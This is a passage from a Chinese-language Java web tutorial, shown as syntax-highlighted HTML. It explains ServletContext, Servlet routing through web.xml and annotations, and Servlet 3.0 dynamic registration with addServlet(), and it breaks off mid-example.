style="--shiki-light:#383A42;--shiki-dark:#E06C75;">()</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">InputStream</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> inputStream </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> context</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getResourceAsStream</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/WEB-INF/config.properties&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><blockquote><p><code>getServletContext()</code> 是一个用于获取 <code>ServletContext</code> 对象的方法。它的作用是让当前的 <code>Servlet</code> 能够访问到 Web 应用的全局上下文，即 <code>ServletContext</code></p><p><strong><code>getServletContext()</code></strong> 是 <code>HttpServlet</code> 类中的方法，它由所有 <code>Servlet</code> 继承。在任何一个 <code>Servlet</code> 中，你都可以调用 <code>getServletContext()</code> 来获取到当前 Web 应用的 <code>ServletContext</code> 实例。</p><p>一旦你通过 <code>getServletContext()</code> 获取了 <code>ServletContext</code>，你就可以调用它的一些方法，比如获取初始化参数、获取应用的文件资源、设置或读取应用级别的共享数据等。</p><p>例如:</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> MyServlet</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> extends</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> HttpServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> protected</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> doGet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletRequest</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletResponse</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">     // 获取ServletContext对象</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">     ServletContext</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> context</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> getServletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">     // 从ServletContext获取初始化参数</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">     String</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> dbUrl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> context</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getInitParameter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;databaseUrl&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">     // 使用ServletContext共享一些数据</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">     context</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">setAttribute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;appName&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;My Awesome App&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">     // 获取文件资源的输入流</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">     InputStream</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> inputStream</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> context</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getResourceAsStream</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/WEB-INF/config.properties&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">     // 进行其他处理</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">     response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getWriter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Database URL: &quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> dbUrl);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p>看上上述代码可能会有一些疑问, 比如 <code>为什么没有看到关于路由设置的操作?</code></p><p>在 Java EE 中，<code>Servlet</code> 的路由（也就是请求映射）通常是通过 <code>web.xml</code> 文件或注解来配置的。上述代码示例只展示了 <code>Servlet</code> 的基本实现，并没有包含路由的配置。</p><p>正常开发上来说有如下两种注册路由的方式:</p><ul><li><p>使用 <code>web.xml</code> 文件: 可以在 <code>web.xml</code> 中定义 <code>Servlet</code> 的映射。示例如下：</p><div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" data-title="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet-name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;MyServlet&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet-name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet-class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;com.example.MyServlet&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet-class</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet-mapping</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet-name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;MyServlet&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet-name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    &lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">url-pattern</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;/myServlet&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">url-pattern</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">servlet-mapping</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在这个例子中，任何访问 <code>/myServlet</code> 的请求都会被 <code>MyServlet</code> 处理。</p></li><li><p><strong>使用注解（Java EE 3.0 及以上）</strong>： 可以直接在 <code>Servlet</code> 类上使用注解来进行路由映射，示例如下：</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.annotation.WebServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">                  </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">WebServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/myServlet&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> MyServlet</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> extends</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> HttpServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    protected</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> doGet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletRequest</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletResponse</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        // 处理请求的逻辑</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个例子中，<code>@WebServlet(&quot;/myServlet&quot;)</code> 注解会将该 <code>Servlet</code> 映射到 <code>/myServlet</code> 路由。</p></li></ul><p>这就是本节开篇所讲述的 Servlet、Listener、Filter 由 <code>javax.servlet.ServletContext</code> 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。</p></blockquote></li></ul><hr><h3 id="servlet-3-0-提供动态注册机制" tabindex="-1"><a class="header-anchor" href="#servlet-3-0-提供动态注册机制"><span>Servlet 3.0+ 提供动态注册机制</span></a></h3><p><strong>Servlet 3.0</strong> 是 Java Servlet 规范的一个版本，于 2009 年发布，带来了许多新特性，使得 Web 应用开发更为灵活和现代化。它是 Java EE 6 的一部分，旨在增强 Servlet 技术的功能和开发者的便利性。</p><p>Servlet 3.0 中与本节内容相关的关键特性如下:</p><ul><li><p><strong>基于注解的配置</strong>：在 Servlet 3.0 中，开发者可以使用注解（如 <code>@WebServlet</code>、<code>@WebFilter</code> 和 <code>@WebListener</code>）来替代传统的 <code>web.xml</code> 文件进行组件的配置和注册。这样可以减少配置文件的复杂性，代码更加简洁。</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">@</span><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">WebServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/hello&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> HelloServlet</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> extends</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> HttpServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    protected</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> doGet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletRequest</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletResponse</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">        response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getWriter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">().</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">println</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Hello World&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>PS: 不可以在 JSP 文件中使用 <code>@WebServlet</code>、<code>@WebFilter</code> 或 <code>@WebListener</code> 注解</p><p>这些注解是用于 Java 类的，而不是用于 JSP 文件。JSP 文件主要用于表示视图层，包含 HTML 和嵌入的 Java 代码，但不适合用于定义 Servlet、Filter 和 Listener。</p><p>运行时环境（如 Tomcat）会扫描和处理 Java 类中的这些注解，以配置相应的 Servlet、Filter 和 Listener。JSP 文件在运行时被转换为 Servlet 类，但在转换之前，它们只是文本文件，不能包含 Java 类级别的注解</p></blockquote></li><li><p><strong>动态注册</strong>：通过 <code>ServletContext</code> 的 <code>addServlet()</code>、<code>addFilter()</code> 和 <code>addListener()</code> 方法，可以动态地在应用启动时注册 <code>Servlet</code>、<code>Filter</code> 和 <code>Listener</code>。这种动态注册使得 Web 应用程序更具灵活性。</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> dynamicServlet </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;DynamicServlet&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> DynamicServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">());</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">dynamicServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addMapping</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/dynamic&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>ServletRegistration.Dynamic</code> 是 Servlet 3.0 规范引入的一个接口，它允许开发者在应用启动时通过 <code>ServletContext</code> 动态注册 <code>Servlet</code>。使用这个接口，可以在代码中添加、配置和管理 <code>Servlet</code>，而不是依赖传统的 <code>web.xml</code> 配置文件。</li><li><code>ServletRegistration.Dynamic</code> 是 <code>ServletRegistration</code> 接口的一个子接口，专门用于动态注册 <code>Servlet</code>。它提供了用于配置 <code>Servlet</code> 的方法，比如设置 URL 映射、初始化参数等。</li><li>通过调用 <code>ServletContext</code> 的 <code>addServlet()</code> 方法，可以得到一个 <code>ServletRegistration.Dynamic</code> 对象，用于进一步配置和映射动态注册的 <code>Servlet</code>。</li><li>可以在 Web 应用启动时（通常是在 <code>ServletContextListener</code> 或 <code>ServletContainerInitializer</code> 中）使用 <code>ServletContext</code> 的 <code>addServlet()</code> 方法来注册新的 <code>Servlet</code>，并通过 <code>ServletRegistration.Dynamic</code> 接口进行配置。</li></ul><p>例如:</p><div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" data-title="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.ServletRegistration</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.http.HttpServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.http.HttpServletRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> javax.servlet.http.HttpServletResponse</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> java.io.IOException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> MyServletInitializer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    public</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> onStartup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">ServletContext</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        // 1. 动态注册一个 Servlet</span></span>
<span class="line"><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">        ServletRegistration</span><span style="--shiki-light:#E45649;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">Dynamic</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> dynamicServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> servletContext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">addServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;MyDynamicServlet&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> HttpServlet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            protected</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> doGet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletRequest</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;">HttpServletResponse</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> response</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> throws</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ServletException</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> IOException</span><span 